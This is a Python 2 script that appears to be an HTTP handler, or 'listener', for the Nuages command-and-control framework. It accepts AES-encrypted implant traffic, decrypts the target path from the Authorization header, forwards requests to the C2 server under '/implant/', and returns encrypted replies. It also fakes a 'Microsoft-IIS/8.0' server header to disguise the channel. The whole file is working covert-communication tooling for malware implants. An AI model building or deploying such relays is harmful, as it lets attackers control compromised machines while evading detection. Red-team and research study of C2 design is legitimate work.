#!/usr/bin/env python
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import base64
import hashlib
import requests
from Crypto import Random
from Crypto.Cipher import AES
import cgi
from sys import argv
import binascii
import StringIO

class HTTPerror(Exception):
    def __init__(self,HTTPCode,HTTPContent):
        self.HTTPCode = HTTPCode
        self.HTTPContent = HTTPContent

class PKCS7Encoder(object):
    def __init__(self, k=16):
       self.k = k

    ## @param text The padded text for which the padding is to be removed.
    # @exception ValueError Raised when the input padding is missing or corrupt.
    def decode(self, text):
        '''
        Remove the PKCS#7 padding from a text string
        '''
        nl = len(text)
        val = int(binascii.hexlify(text[-1]), 16)
        if val > self.k:
            raise ValueError('Input is not padded or padding is corrupt')

        l = nl - val
        return text[:l]

    ## @param text The text to encode.
    def encode(self, text):
        '''
        Pad an input string according to PKCS#7
        '''
        l = len(text)
        output = StringIO.StringIO()
        val = self.k - (l % self.k)
        for _ in xrange(val):
            output.write('%02x' % val)
        return text + binascii.unhexlify(output.getvalue())

class AESCipher(object):

    def __init__(self, key): 
        self.bs = 32
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        #return base64.b64encode(iv + cipher.encrypt(raw))
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        #enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return pkcs7.encode(s)

    def _unpad(self, s):
        return pkcs7.decode(s)

        
class S(BaseHTTPRequestHandler):
    def send_response(self, code, message=None):
        """Send the response header and log the response code.
        Also send two standard headers with the server software
        version and the current date.
        """
        self.log_request(code)
        if message is None:
            if code in self.responses:
                message = self.responses[code][0]
            else:
                message = ''
        if self.request_version != 'HTTP/0.9':
            self.wfile.write("%s %d %s\r\n" %
                             (self.protocol_version, code, message))
            # print (self.protocol_version, code, message)
        self.send_header('Server', "Microsoft-IIS/8.0")
        self.send_header('Date', self.date_time_string())

    def _set_headers(self, code):
        self.send_response(code)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def POST(self, url, body):
        headers = {'Content-type': 'application/json; charset=utf-8'}
        response = requests.post(connectionString + url, data = body.encode('utf-8'), verify=True, headers=headers)
        if(response.ok):
            return response.content
        else:
            raise HTTPerror(response.status_code,response.content)

    def do_POST(self):
        length = int(self.headers.getheader('content-length'))
        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers.getheader('Authorization')))
        print(url)
        try:
            response = (self.POST(url,aes.decrypt(self.rfile.read(length))))
            self._set_headers(200)
            self.wfile.write(aes.encrypt(response))
        except HTTPerror as e:
            #self.send_error
            #self.wfile.write(aes.encrypt(e.HTTPContent)
            self._set_headers(e.HTTPCode)
            self.wfile.write(aes.encrypt(e.HTTPContent))
        
        except Exception as e:
            #self.send_error
            #self.wfile.write(aes.encrypt(e.HTTPContent)
            print(e)
        
def run(server_class=HTTPServer, handler_class=S, port=4040):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('Starting httpd...')
    httpd.serve_forever()

if __name__ == "__main__":
    # The encryption password
    aes = AESCipher("PASSWORD")
    #The address of the Nuages C2 Server
    connectionString  = "http://127.0.0.1:3030"
    pkcs7 = PKCS7Encoder()
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
